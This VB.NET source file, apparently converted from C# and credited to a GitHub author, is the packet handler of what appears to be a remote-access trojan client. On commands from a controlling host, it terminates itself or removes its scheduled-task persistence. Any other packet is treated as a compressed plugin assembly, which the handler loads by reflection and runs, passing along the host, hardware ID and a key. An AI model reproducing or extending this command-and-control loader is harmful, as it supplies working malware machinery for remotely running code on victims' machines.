Imports PacketLib
Imports PacketLib.Packet
Imports System.Diagnostics

' 
'|| AUTHOR Arsium ||
'|| github : https://github.com/arsium       ||
'|| Converted from C# code with Tangible Source Code Converters 2022.01 ||
'

Namespace Client
	Friend Module PacketHandler

		Friend Delegate Sub PluginDelegate(ByVal packet As IPacket)
		Friend pluginDelegateAsync As PluginDelegate

		Sub New()
			pluginDelegateAsync = New PluginDelegate(AddressOf LoadPlugin)
		End Sub


		Public Sub ParsePacket(ByVal packet As IPacket)

			Try
				Select Case packet.packetType
					Case PacketType.CONNECTED
						StarterClass.clientHandler.baseIp = packet.baseIp

					Case (PacketType.CLOSE_CLIENT)
						StarterClass.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0)

					Case (PacketType.UNINSTALL_CLOSE_CLIENT)
						Persistence.Launch.RemoveTaskScheduler(Config.taskName)

					Case Else
						pluginDelegateAsync.BeginInvoke(packet, New AsyncCallback(AddressOf EndLoadPlugin), Nothing)

				End Select
			Catch
			End Try
		End Sub

		Public Sub LoadPlugin(ByVal packet As IPacket)
			Dim assemblytoload As System.Reflection.Assembly = System.Reflection.Assembly.Load(Compressor.QuickLZ.Decompress(packet.plugin))
			Dim method As System.Reflection.MethodInfo = assemblytoload.GetType("Plugin.Launch").GetMethod("Main")
			Dim obj As Object = assemblytoload.CreateInstance(method.Name)
			Dim loadingAPI As LoadingAPI = New LoadingAPI With
				{
				.host = StarterClass.clientHandler.host,
				.baseIp = StarterClass.clientHandler.baseIp,
				.HWID = StarterClass.clientHandler.HWID,
				.key = Config.generalKey,
				.currentPacket = packet
				}
			method.Invoke(obj, New Object() {loadingAPI})
		End Sub

		Public Sub EndLoadPlugin(ByVal ar As IAsyncResult)
			pluginDelegateAsync.EndInvoke(ar)
		End Sub
	End Module
End Namespace
